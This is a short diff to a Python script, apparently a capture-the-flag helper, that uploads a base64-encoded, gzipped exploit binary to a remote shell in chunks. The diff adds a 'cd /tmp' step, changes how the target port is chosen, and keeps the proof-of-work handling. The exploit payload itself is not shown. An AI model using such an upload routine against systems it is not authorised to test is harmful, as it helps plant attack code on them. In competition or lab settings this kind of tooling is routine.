@@ -16,6 +16,8 @@ exploit_bin = "exploit.gz.b64"
 ## exploit ###########################################
 
 def exploit():
+  global c
+
   if os.getenv("REQUIRE_POW") == "1":
     hashcat = c.recvline().rstrip().decode('utf-8')
     print("[+] calculating PoW...")
@@ -29,6 +31,9 @@ def exploit():
 
   progress = 0
   N = 0x300
+
+  c.sendlineafter('$', 'cd /tmp')
+
   print("[+] sending base64ed exploit (total: {})...".format(hex(len(binary))))
   for s in [binary[i: i+N] for i in range(0, len(binary), N)]:
     c.sendlineafter('$', 'echo -n "{}" >> exploit.gz.b64'.format(s)) # don't forget -n
@@ -55,7 +60,9 @@ def _overwrite_targets():
 
   port = os.getenv("EXPLOIT_PORT")
   if port is not None:
-    rhp2["port"] = port
+    rhp1["port"] = port
+  else:
+    sys.exit(1)
 
   _exploit_bin = os.getenv("EXPLOIT_BIN")
   if exploit_bin is not None:
